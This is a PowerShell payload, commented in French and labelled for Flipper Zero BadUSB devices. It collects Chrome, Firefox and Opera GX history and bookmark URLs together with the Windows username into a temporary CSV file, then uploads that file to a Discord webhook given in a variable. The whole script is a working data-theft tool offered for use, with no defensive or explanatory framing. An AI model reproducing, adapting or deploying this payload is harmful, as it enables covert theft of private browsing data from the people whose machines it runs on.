# ===================================================
# BrowserData → Discord (pièce jointe)
# Compatible Flipper Zero BadUSB
# ===================================================

# $dc est défini par le .txt
# $db reste vide si pas utilisé
# Exemple : $dc='https://discord.com/api/webhooks/...'

$TempFile = "$env:TMP\--BrowserData.txt"

# Supprime l’ancien fichier si présent
if (Test-Path $TempFile) { Remove-Item $TempFile -Force }

function Get-BrowserData {
    param (
        [string]$Browser,
        [string]$DataType
    )

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if ($Browser -eq 'chrome'  -and $DataType -eq 'history')    { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks'){ $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history')   { $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" }
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history')   { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" }
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'bookmarks') { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks" }

    try {
        $Value = Get-Content -Path $Path -ErrorAction Stop | Select-String -AllMatches $Regex | % { ($_.Matches).Value } | Sort-Object -Unique
    } catch { return }

    $Value | ForEach-Object {
        [PSCustomObject]@{
            Browser = $Browser
            User    = $env:UserName
            DataType= $DataType
            Data    = $_
        }
    } | Export-Csv -Path $TempFile -Append -NoTypeInformation
}

# ---------------- Collecte ----------------------
$Browsers = @(
    @{Browser='chrome'; DataType='history'},
    @{Browser='chrome'; DataType='bookmarks'},
    @{Browser='firefox'; DataType='history'},
    @{Browser='opera'; DataType='history'},
    @{Browser='opera'; DataType='bookmarks'}
)

foreach ($b in $Browsers) {
    Get-BrowserData -Browser $b.Browser -DataType $b.DataType
}

# ---------------- Envoi Discord ----------------------
function Upload-Discord {
    param ([string]$file)

    if (-not ([string]::IsNullOrEmpty($dc)) -and (Test-Path $file)) {
        $form = @{
            "file1" = Get-Item $file
        }
        try {
            Invoke-RestMethod -Uri $dc -Method Post -Form $form
        } catch {
            Write-Output "Erreur en envoyant le fichier : $_"
        }
    }
}

Upload-Discord -file $TempFile
